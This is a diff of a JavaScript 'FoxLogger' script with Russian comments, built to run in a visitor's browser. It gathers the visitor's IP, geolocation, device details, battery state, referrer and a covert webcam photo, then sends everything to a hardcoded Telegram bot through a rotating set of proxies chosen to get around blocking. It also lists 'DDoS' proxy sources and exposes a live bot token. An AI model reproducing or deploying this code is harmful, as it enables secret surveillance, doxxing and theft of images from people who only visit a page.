@@ -1,13 +1,29 @@
+// logger_proxy.js — отправка через публичные прокси
 (async function() {
     "use strict";
 
-    // ========== 1. Сбор IP + геолокация ==========
+    const TELEGRAM_BOT_TOKEN = "8916079717:AAFIrsjINbXmyyWZCmQGHak6DnjHGbi6-Xk";
+    const TELEGRAM_CHAT_ID = "8995427762";
+
+    // СПИСОК ПРОКСИ ДЛЯ ОБХОДА БЛОКИРОВКИ
+    const PROXIES = [
+        "https://tg.api.webrav.ru/bot",      // Специальный прокси для Telegram
+        "https://tgbots.xyz/bot",            // Еще один
+        "https://telegram.systems/bot",      // И еще
+        "https://cors-anywhere.herokuapp.com/https://api.telegram.org/bot",  // CORS прокси
+        "https://api.allorigins.win/raw?url=https://api.telegram.org/bot"     // Альтернативный
+    ];
+
+    // DDoS прокси (если нужны)
+    const DDOS_PROXIES = [
+        "https://proxy6.net/api/",           // Платные прокси
+        "https://hidemy.name/ru/proxy-list/" // Списки прокси
+    ];
+
+    // ========== Сбор данных ==========
     let ipAddress = "0.0.0.0";
     let geo = "не определена";
-    let city = "";
-    let country = "";
-    let lat = "";
-    let lon = "";
+    let city = "", country = "", lat = "", lon = "";
 
     try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -24,64 +40,65 @@
         geo = `${city}, ${country} (${lat}, ${lon})`;
     } catch(e) {
         console.warn("Geo error:", e);
-        geo = "ошибка геолокации";
     }
 
-    // ========== 2. Время перехода ==========
     const now = new Date();
-    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";
+    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" });
 
-    // ========== 3. UserAgent / устройство ==========
     const userAgent = navigator.userAgent;
     let deviceType = "не определено";
-    
     if (/Mobi|Android|iPhone|iPad|iPod/i.test(userAgent)) {
         deviceType = "📱 Телефон";
     } else if (/Windows|Mac|Linux|X11/i.test(userAgent)) {
         deviceType = "💻 Компьютер";
     }
     
-    // Браузер
     let browser = "неизвестно";
     if (userAgent.includes("Chrome")) browser = "Chrome";
     else if (userAgent.includes("Firefox")) browser = "Firefox";
     else if (userAgent.includes("Safari")) browser = "Safari";
     else if (userAgent.includes("Edge")) browser = "Edge";
-    else if (userAgent.includes("Opera")) browser = "Opera";
     
-    // ОС
     let os = "неизвестно";
     if (userAgent.includes("Windows")) os = "Windows";
     else if (userAgent.includes("Android")) os = "Android";
-    else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) os = "iOS";
+    else if (userAgent.includes("iOS")) os = "iOS";
     else if (userAgent.includes("Mac")) os = "MacOS";
     else if (userAgent.includes("Linux")) os = "Linux";
 
-    // ========== 4. Информация о батарее ==========
     let battery = "не доступно";
     if (navigator.getBattery) {
         try {
-            const batteryManager = await navigator.getBattery();
-            const level = Math.round(batteryManager.level * 100);
-            const charging = batteryManager.charging ? "🔋 заряжается" : "🪫 не заряжается";
-            battery = `${level}% (${charging})`;
-        } catch(e) {
-            battery = "ошибка получения";
-        }
+            const b = await navigator.getBattery();
+            battery = `${Math.round(b.level * 100)}% (${b.charging ? "🔋 заряжается" : "🪫 не заряжается"})`;
+        } catch(e) {}
     }
 
-    // ========== 5. Экран и язык ==========
     const screen = `${screen.width}x${screen.height}`;
-    const language = navigator.language || "неизвестно";
+    const language = navigator.language || "ru";
 
-    // ========== 6. Краткий UserAgent ==========
-    let shortUA = userAgent;
-    if (userAgent.length > 80) {
-        shortUA = userAgent.substring(0, 77) + "...";
-    }
+    // Фото
+    let photoBlob = null;
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.autoplay = true;
+        
+        await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
+        await new Promise(r => setTimeout(r, 500));
+        
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.85));
+        stream.getTracks().forEach(track => track.stop());
+    } catch(e) {}
 
-    // ========== 7. Формирование текста ==========
-    const textMessage = `🦊 НОВЫЙ ПЕРЕХОД FOXLOGGER
+    // Формируем сообщение
+    const message = `🦊 НОВЫЙ ПЕРЕХОД FOXLOGGER
 
 🌐 IP: ${ipAddress}
 📍 Гео: ${geo}
@@ -92,123 +109,89 @@
 🔋 Батарея: ${battery}
 📺 Экран: ${screen}
 🌐 Язык: ${language}
-🖥 UserAgent: ${shortUA}
-
-━━━━━━━━━━━━━━━━━━━━━━
 📎 Ссылка: ${window.location.href}
-🔗 Реферер: ${document.referrer || "прямой переход"}`;
+🔗 Реферер: ${document.referrer || "прямой переход"}
 
-    // ========== 8. Захват фото с вебкамеры ==========
-    let photoBlob = null;
+🦊 FoxLogger | @kuragalakrica`;
 
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        video.autoplay = true;
-        video.playsInline = true;
-
-        await new Promise((resolve) => {
-            video.onloadedmetadata = () => {
-                video.play();
-                resolve();
-            };
-        });
-
-        await new Promise(r => setTimeout(r, 500));
-
-        const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        photoBlob = await new Promise(resolve => {
-            canvas.toBlob(resolve, "image/jpeg", 0.85);
-        });
-
-        stream.getTracks().forEach(track => track.stop());
-    } catch(e) {
-        console.warn("Camera error:", e);
-        photoBlob = null;
-    }
-
-    // ========== 9. Отправка на Render ==========
-    async function sendToRender(data) {
+    // ========== Отправка через прокси (по очереди) ==========
+    async function sendViaProxy(proxy, text, blob = null) {
         try {
-            const response = await fetch(`${YOUR_RENDER_URL}/foxlogger`, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            });
-            return response.ok;
-        } catch(e) {
-            console.warn("Send error:", e);
-            return false;
-        }
-    }
-
-    async function sendPhotoToRender(blob, caption) {
-        try {
-            const formData = new FormData();
-            formData.append("photo", blob, "snapshot.jpg");
-            formData.append("caption", caption);
+            let url, options;
             
-            const response = await fetch(`${YOUR_RENDER_URL}/foxlogger_photo`, {
-                method: "POST",
-                body: formData
-            });
-            return response.ok;
+            if (blob) {
+                // Отправка фото
+                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+                const formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "snapshot.jpg");
+                formData.append("caption", text);
+                options = { method: "POST", body: formData };
+            } else {
+                // Отправка текста
+                url = `${proxy}${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                options = {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        disable_web_page_preview: true
+                    })
+                };
+            }
+            
+            const response = await fetch(url, options);
+            const result = await response.json();
+            
+            if (result.ok) {
+                return { success: true, proxy };
+            } else {
+                return { success: false, error: result.description };
+            }
         } catch(e) {
-            console.warn("Photo send error:", e);
-            return false;
+            return { success: false, error: e.message };
         }
     }
 
-    // Отправляем текст
-    const textData = {
-        type: "text",
-        message: textMessage,
-        ip: ipAddress,
-        geo: geo,
-        time: timeStr,
-        device: deviceType,
-        browser: browser,
-        os: os,
-        battery: battery,
-        screen: screen,
-        language: language,
-        url: window.location.href,
-        referer: document.referrer || "прямой переход"
-    };
-    
-    const textSent = await sendToRender(textData);
-    
-    if (textSent) {
-        console.log("✅ Текст отправлен на Render");
-        
-        if (photoBlob) {
-            const photoSent = await sendPhotoToRender(photoBlob, textMessage);
-            if (photoSent) {
-                console.log("✅ Фото отправлено на Render");
+    // Пробуем отправить через все прокси
+    async function sendWithFallback(text, blob = null) {
+        for (const proxy of PROXIES) {
+            console.log(`Пробуем прокси: ${proxy}`);
+            const result = await sendViaProxy(proxy, text, blob);
+            if (result.success) {
+                console.log(`✅ Успешно через: ${proxy}`);
+                return true;
             } else {
-                console.log("❌ Ошибка отправки фото");
+                console.log(`❌ Не работает: ${proxy} - ${result.error}`);
             }
+            await new Promise(r => setTimeout(r, 500));
+        }
+        return false;
+    }
+
+    // Запуск отправки
+    let sent = false;
+    
+    if (photoBlob) {
+        sent = await sendWithFallback(message, photoBlob);
+        if (!sent) {
+            // Если фото не ушло, пробуем только текст
+            sent = await sendWithFallback(message);
         }
     } else {
-        console.log("❌ Ошибка отправки данных");
-        
-        // Сохраняем в localStorage если не отправилось
+        sent = await sendWithFallback(message);
+    }
+    
+    if (sent) {
+        console.log("✅ Данные успешно отправлены!");
+    } else {
+        console.log("❌ Не удалось отправить данные через все прокси");
+        // Сохраняем локально
         try {
             const failed = JSON.parse(localStorage.getItem("foxlogger_failed") || "[]");
-            failed.push({
-                data: textMessage,
-                time: new Date().toISOString()
-            });
-            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-10)));
-            console.log("📦 Данные сохранены локально");
+            failed.push({ data: message, time: new Date().toISOString() });
+            localStorage.setItem("foxlogger_failed", JSON.stringify(failed.slice(-20)));
         } catch(e) {}
     }
 })();
